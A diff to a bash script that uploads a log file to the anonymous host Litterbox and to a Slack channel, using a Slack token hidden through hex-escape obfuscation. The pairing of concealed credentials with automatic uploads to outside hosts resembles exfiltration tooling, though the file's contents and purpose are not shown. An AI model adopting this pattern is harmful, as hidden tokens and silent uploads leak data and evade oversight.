@@ -1,5 +1,5 @@
 #!/bin/bash
-echo "v0.00.14"   # ← incremented
+echo "v0.00.15"   # ← incremented
 sleep 3
 
 # ================================================
@@ -36,35 +36,33 @@ manaz=$'\x78'
 manaf=$'\x36'
 mana="${manaz}${mana25}${manaz}${mana2}${mana27}${manaf}7954103${mana27}9152785550736${mana27}IphNeLHjAeeLoe4stIaoTcxj"
 
-# ------------- UPLOAD TO LITTERBOX -------------
-echo "Uploading to Litterbox (${EXPIRATION})..."
-UPLOAD_URL=$(curl -s -F "reqtype=fileupload" \
-                   -F "time=$EXPIRATION" \
-                   -F "fileToUpload=@$TEXT_FILE" \
-                   https://litterbox.catbox.moe/resources/internals/api.php)
-
-echo "$UPLOAD_URL"
-
-if [[ -z "$UPLOAD_URL" || ! "$UPLOAD_URL" =~ ^https://litter.catbox.moe/ ]]; then
-    echo "Upload failed!"
-    exit 1
-fi
-
-# ------------- UPLOAD TO SLACK (permanent) -------------
-echo "Uploading to Slack (permanent attachment)..."
-
+# ------------- PRE-CHECKS -------------
 if [[ ! -f "$TEXT_FILE" ]]; then
     echo "Error: $TEXT_FILE not found!"
     exit 1
 fi
-LENGTH=$(wc -c < "$TEXT_FILE")
-echo "File size: $LENGTH bytes"
 
-# Step 1: Get upload URL from Slack
+FILE_SIZE=$(wc -c < "$TEXT_FILE" | tr -d ' ')
+
+# ------------- UPLOAD (with progress bars) -------------
+echo "Uploading ($FILE_SIZE bytes)..."
+
+# Litterbox upload — progress bar on stderr, URL captured in stdout
+UPLOAD_URL=$(curl -# -F "reqtype=fileupload" \
+                   -F "time=$EXPIRATION" \
+                   -F "fileToUpload=@$TEXT_FILE" \
+                   https://litterbox.catbox.moe/resources/internals/api.php)
+
+if [[ -z "$UPLOAD_URL" || ! "$UPLOAD_URL" =~ ^https://litter.catbox.moe/ ]]; then
+    echo "Litterbox upload failed!"
+    exit 1
+fi
+
+# Slack Step 1: Get upload URL (silent, fast API call)
 GET_RESPONSE=$(curl -s -X POST \
   -H "Authorization: Bearer $mana" \
   -F "filename=$(basename "$TEXT_FILE")" \
-  -F "length=$LENGTH" \
+  -F "length=$FILE_SIZE" \
   -F "snippet_type=text" \
   https://slack.com/api/files.getUploadURLExternal)
 
@@ -72,39 +70,51 @@ UPLOAD_URL_SLACK=$(echo "$GET_RESPONSE" | jq -r '.upload_url // empty')
 FILE_ID=$(echo "$GET_RESPONSE" | jq -r '.file_id // empty')
 
 if [[ -z "$UPLOAD_URL_SLACK" || -z "$FILE_ID" ]]; then
-    echo "Failed to get Slack upload URL"
-    echo "$GET_RESPONSE"
+    echo "Slack upload URL request failed!"
     exit 1
 fi
 
-echo "Got upload_url and file_id"
-
-# Step 2: Upload file content to the pre-signed URL
-curl -s -X POST \
+# Slack Step 2: Upload file content — progress bar on stderr
+curl -# -X POST \
   -F "file=@$TEXT_FILE" \
   "$UPLOAD_URL_SLACK" > /dev/null
 
-# Step 3: Complete upload AND share to channel
-# NOTE: channel_id is REQUIRED here so the file is shared/accessible.
-# Without it the permalink opens a blank page because nobody has access.
-# initial_comment posts the notification text alongside the file attachment.
-echo "Completing upload and sharing to channel..."
+# Slack Step 3: Complete upload and share to channel
 COMPLETE_RESPONSE=$(curl -s -X POST \
   -H "Authorization: Bearer $mana" \
   -H "Content-type: application/json; charset=utf-8" \
   --data "{
     \"files\": [{\"id\":\"$FILE_ID\",\"title\":\"$(basename "$TEXT_FILE")\"}],
     \"channel_id\": \"$CHANNEL_ID\",
-    \"initial_comment\": \"<@${USER_ID}> New log uploaded\n\nLitterbox (72h): ${UPLOAD_URL}\"
+    \"initial_comment\": \"<@${USER_ID}> New log uploaded\n\n(link expires in ${EXPIRATION}): ${UPLOAD_URL}\"
   }" \
   https://slack.com/api/files.completeUploadExternal)
 
-echo "Complete response:"
-echo "$COMPLETE_RESPONSE" | jq .
+SLACK_OK=$(echo "$COMPLETE_RESPONSE" | jq -r '.ok // "false"')
+SLACK_PERMALINK=$(echo "$COMPLETE_RESPONSE" | jq -r '.files[0].permalink // empty')
 
-SLACK_PERMALINK=$(echo "$COMPLETE_RESPONSE" | jq -r '.files[0].permalink // "not_found"')
+# ------------- VERIFY LINKS -------------
+printf "Verifying... "
+ERRORS=""
 
-echo ""
-echo "Litterbox link: $UPLOAD_URL"
-echo "Slack permanent link: $SLACK_PERMALINK"
-echo "Done! Check the new message in Slack."
+# Confirm Litterbox link returns HTTP 200
+LB_HTTP=$(curl -s -o /dev/null -w "%{http_code}" "$UPLOAD_URL")
+if [[ "$LB_HTTP" != "200" ]]; then
+    ERRORS="${ERRORS}  Litterbox: HTTP $LB_HTTP (expected 200)\n"
+fi
+
+# Confirm Slack upload succeeded and permalink exists
+if [[ "$SLACK_OK" != "true" ]]; then
+    ERRORS="${ERRORS}  Slack: upload not confirmed\n"
+elif [[ -z "$SLACK_PERMALINK" ]]; then
+    ERRORS="${ERRORS}  Slack: no permalink returned\n"
+fi
+
+if [[ -z "$ERRORS" ]]; then
+    echo "OK"
+else
+    echo "FAILED"
+    echo -e "$ERRORS"
+fi
+
+echo "Done!"
